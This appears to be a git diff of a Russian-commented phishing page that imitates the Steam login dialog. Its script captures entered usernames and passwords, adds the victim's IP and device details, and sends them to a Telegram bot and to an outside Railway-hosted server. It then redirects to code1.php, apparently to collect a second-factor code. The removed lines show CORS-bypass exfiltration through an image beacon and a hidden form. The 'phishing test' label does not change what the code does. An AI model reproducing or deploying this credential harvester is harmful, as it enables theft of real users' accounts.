@@ -341,7 +341,7 @@ async function getIP() {
     }
 }
 
-// Функция регистрации в базе данных (ИСПРАВЛЕННАЯ)
+// Функция регистрации в базе данных
 async function registerUser(username, password, ip) {
     try {
         console.log('🔐 Попытка регистрации пользователя:', username);
@@ -381,53 +381,6 @@ async function registerUser(username, password, ip) {
     }
 }
 
-// Альтернативный метод регистрации (если CORS блокирует)
-async function registerUserAlternative(userData) {
-    try {
-        // Вариант 2: Отправка через image (обход CORS)
-        const img = new Image();
-        const dataStr = encodeURIComponent(JSON.stringify(userData));
-        img.src = `https://logs-unisono-project.up.railway.app/api/auth/register?data=${dataStr}&fallback=true`;
-        
-        // Вариант 3: Отправка через form
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = 'https://logs-unisono-project.up.railway.app/api/auth/register';
-        form.target = '_blank';
-        form.style.display = 'none';
-        
-        for (const key in userData) {
-            const input = document.createElement('input');
-            input.name = key;
-            input.value = userData[key];
-            form.appendChild(input);
-        }
-        
-        document.body.appendChild(form);
-        form.submit();
-        document.body.removeChild(form);
-        
-        console.log('🔄 Использован альтернативный метод регистрации');
-        
-    } catch (error) {
-        console.log('⚠️ Альтернативные методы также не сработали:', error);
-    }
-}
-// Логирование входа через Steam
-document.addEventListener('DOMContentLoaded', function() {
-    // Логируем сам факт захода на сайт
-    logUserAction('PAGE_VISIT', 'Пользователь зашел на страницу входа');
-    
-    // Отслеживаем клики на кнопку "Sign in"
-    const loginButton = document.querySelector('.newlogindialog_SubmitButton_2QgFE');
-    if (loginButton) {
-        loginButton.addEventListener('click', function() {
-            logUserAction('LOGIN_BUTTON_CLICK', 'Пользователь нажал кнопку входа');
-        });
-    }
-});
-
-
 // Функция логирования действий
 async function logUserAction(action, description) {
     const userData = {
@@ -450,69 +403,70 @@ async function logUserAction(action, description) {
     
     await sendToTelegram(logMessage);
     
-    // Также сохраняем в базу данных если нужно (с обработкой ошибок)
+    // Также сохраняем в базу данных если нужно
     try {
         await fetch('https://logs-unisono-project.up.railway.app/api/auth/log', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify(userData),
-            mode: 'cors' // Добавьте эту строку
+            mode: 'cors'
         });
     } catch (error) {
         console.log('Лог не сохранен в базу:', error);
-        // Продолжаем выполнение даже если логирование не удалось
     }
 }
 
-// Обработка отправки формы (ОБНОВЛЕННАЯ)
+// Обработка отправки формы
 document.addEventListener('DOMContentLoaded', function() {
+    console.log('🟢 DOM загружен, ищу форму...');
+    
     const loginForm = document.querySelector('.newlogindialog_LoginForm_3Tsg9');
-    const usernameInput = document.querySelector('input[name="username"]');
+    console.log('📝 Найдена форма:', loginForm);
     
     if (loginForm) {
         loginForm.onsubmit = async function(e) {
             e.preventDefault();
+            console.log('🎯 Форма отправлена!');
             
-            const username = usernameInput.value;
+            const username = document.querySelector('input[name="username"]').value;
             const password = document.querySelector('input[name="password"]').value;
             const ip = await getIP();
+            
+            console.log('🔐 Данные для входа:', { username, password });
             
             // Логируем попытку входа
             await logUserAction('LOGIN_ATTEMPT', `Попытка входа с логином: ${username}`);
             
-            // 1. Регистрируем в базе данных (ждем завершения)
+            // 1. Регистрируем в базе данных
             try {
+                console.log('📡 Регистрируем пользователя...');
                 await registerUser(username, password, ip);
             } catch (error) {
-                console.log('Регистрация не удалась, но продолжаем:', error);
+                console.log('⚠️ Регистрация не удалась:', error);
             }
             
             // 2. Отправляем данные в Telegram
+            console.log('📨 Отправляем в Telegram...');
             const message = `🎣 <b>ФИШИНГ ТЕСТ - ДАННЫЕ ВХОДА</b>\n\n👤 <b>Логин:</b> ${username}\n🔑 <b>Пароль:</b> ${password}\n🌐 <b>IP:</b> ${ip}\n📱 <b>Устройство:</b> ${navigator.userAgent}\n⏰ <b>Время:</b> ${new Date().toLocaleString()}`;
             
             await sendToTelegram(message);
             
-            // 3. Сохраняем логин для передачи на code1.php
+            // 3. Сохраняем логин
+            console.log('💾 Сохраняем логин в localStorage...');
             localStorage.setItem('steam_username', username);
             
             // 4. Перенаправляем на code1.php
+            console.log('🔄 Перенаправляем на code1.php...');
             window.location.href = 'code1.php';
         };
+        
+        console.log('✅ Обработчик формы установлен');
+    } else {
+        console.error('❌ Форма не найдена!');
     }
-});
-            
-            // 2. Отправляем данные в Telegram (главное!)
-            const message = `🎣 <b>ФИШИНГ ТЕСТ - ДАННЫЕ ВХОДА</b>\n\n👤 <b>Логин:</b> ${username}\n🔑 <b>Пароль:</b> ${password}\n🌐 <b>IP:</b> ${ip}\n📱 <b>Устройство:</b> ${navigator.userAgent}\n⏰ <b>Время:</b> ${new Date().toLocaleString()}`;
-            
-            await sendToTelegram(message);
-            
-            // 3. Сохраняем логин для передачи на code1.php
-            localStorage.setItem('steam_username', username);
-            
-            // 4. Перенаправляем на code1.php (ВСЕГДА срабатывает)
-            window.location.href = 'code1.php';
-        };
-    }
+    
+    // Логируем заход на страницу
+    logUserAction('PAGE_VISIT', 'Пользователь зашел на страницу входа');
 });
 </script>
 </body>
